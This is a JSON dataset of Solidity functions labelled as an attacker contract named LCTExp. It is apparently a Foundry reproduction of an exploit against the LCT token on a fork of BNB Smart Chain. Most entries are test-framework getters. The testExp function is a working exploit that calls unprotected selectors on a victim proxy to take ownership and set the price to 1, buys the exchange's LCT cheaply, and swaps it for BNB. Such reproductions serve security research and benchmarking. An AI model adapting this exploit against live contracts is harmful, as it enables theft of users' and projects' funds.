[
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_460_897);\n        deal(address(this), 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LCTExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BNB Balance\", address(this).balance, 18);\n\n        // Step1: get ownership\n        bytes4 selector1 = 0xb5863c10;\n        address temp = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE; // seems just some random meaningless address\n        bytes memory data1 = new bytes(36);\n        assembly {\n            mstore(add(data1, 0x20), selector1)\n            mstore(add(data1, 0x24), temp)\n        }\n        (bool success1,) = victim_proxy.call(data1);\n        require(success1, \"change ownership failed\");\n\n        // Step2: manipulate price\n        bytes4 selector2 = 0x925d400c;\n        uint256 new_price = 1;\n        bytes memory data2 = new bytes(36);\n        assembly {\n            mstore(add(data2, 0x20), selector2)\n            mstore(add(data2, 0x24), new_price)\n        }\n        (bool success2,) = victim_proxy.call(data2);\n        require(success2, \"manipulate price failed\");\n\n        // Step3: buy cheap LCT\n        // emit log_named_decimal_uint(\"LCT Balance of Exchange\", LCT.balanceOf(address(exchange)), 18);\n        uint256 amount = LCT.balanceOf(address(exchange)) / 1e18;\n        exchange.buyTokens{value: amount}();\n        // emit log_named_decimal_uint(\"LCT Balance of contract\", LCT.balanceOf(address(this)), 18);\n\n        // Step4: swap cheap LCT to BNB in dex\n        LCT.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LCT);\n        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            LCT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000\n        );\n\n        emit log_named_decimal_uint(\"[End] Attacker BNB Balance\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  }
]